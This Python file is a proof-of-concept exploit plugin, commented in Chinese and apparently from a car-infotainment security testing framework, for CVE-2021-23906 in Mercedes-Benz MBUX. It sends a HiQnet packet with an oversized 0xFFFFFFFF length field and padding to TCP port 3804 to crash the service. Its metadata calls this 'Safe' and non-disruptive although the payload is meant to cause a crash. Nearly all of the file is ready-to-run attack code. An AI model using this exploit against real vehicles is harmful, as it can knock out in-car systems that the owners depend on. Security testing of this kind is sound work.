"""
PoC Name: HiQnet Audio Protocol Stack Overflow
CVE: CVE-2021-23906
Component: Application Stack
Category: Application
Severity: Critical
CVSS: 9.8
Description: 畸形HiQnet头部(长度0xFFFFFFFF)触发TCP:3804栈溢出
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 04_HiQnet_Stack_Overflow_TCP.py <target_ip>
"""
import socket
import struct
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

class MercedesHiQnetPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-004"
    """
    CVE-2021-23906: Mercedes-Benz MBUX HiQnet Stack Overflow POC
    目标端口: 3804 (TCP)
    """
    meta_poc_name = "HiQnet Stack Overflow TCP"
    meta_cve_id = "CVE-2021-23906"
    meta_severity = "Critical"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    
    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.target_port = 3804
        self.results["cve_id"] = "CVE-2021-23906"
        self.results["cvss_score"] = 9.8 

    def check_prerequisites(self):
        """检查目标端口连通性"""
        if not self.target_ip:
            self.logger.error("未指定目标IP")
            return False
            
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            result = sock.connect_ex((self.target_ip, self.target_port))
            if result == 0:
                self.logger.info(f"目标端口 {self.target_ip}:{self.target_port} 开放。")
                return True
            else:
                self.logger.warning(f"目标端口 {self.target_ip}:{self.target_port} 未开放。")
                return False
        finally:
            sock.close()

    def exploit(self):
        """
        发送畸形的 HiQnet 头部，声明超长长度触发溢出。
        """
        self.logger.info(f"开始向 {self.target_ip}:{self.target_port} 发送溢出Payload...")
        
        # 构造 HiQnet 头部
        # 根据协议格式：Version (1B) | Header Len (1B) | Msg Len (4B) |...
        version = b'\x02'
        header_len = b'\x19' # 25 bytes
        
        # 【漏洞点】：Message Length 字段
        # 设置为一个巨大的值 (0xFFFFFFFF) 触发整数溢出或后续拷贝溢出
        malicious_msg_len = struct.pack('>I', 0xFFFFFFFF) 
        
        source_addr = b'\x00\x01\x00\x00\x00\x00'
        dest_addr = b'\x00\x02\x00\x00\x00\x00' 
        msg_id = b'\x00\x00' 
        flags = b'\x00\x20'
        hop_count = b'\x05'
        seq_num = b'\x00\x00'
        
        header = (version + header_len + malicious_msg_len + source_addr + 
                  dest_addr + msg_id + flags + hop_count + seq_num)
        
        # 实际 Payload 较短，与 Header 中声明的 Length 不符
        payload = b'A' * 1024 
        packet = header + payload
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, self.target_port))
            s.send(packet)
            
            # 尝试读取响应，如果连接被重置或超时，可能表示服务崩溃
            s.settimeout(5)
            try:
                data = s.recv(1024)
                self.logger.info(f"收到响应 (未崩溃): {data.hex()}")
                self.results["vulnerable"] = False
                self.results["evidence"] = "Service responded normally."
            except (socket.timeout, ConnectionResetError, BrokenPipeError):
                self.logger.info("连接中断或超时，目标服务可能已崩溃 (DOS/Crash)。")
                self.results["vulnerable"] = True
                self.results["evidence"] = "Service crashed or connection reset immediately after malformed packet."
            
            s.close()
        except Exception as e:
            self.logger.error(f"攻击过程异常: {e}")
            self.results["vulnerable"] = False # 连接不上不算漏洞利用成功
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 04_HiQnet_Stack_Overflow_TCP.py <target_ip>")
        sys.exit(1)
    plugin = MercedesHiQnetPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
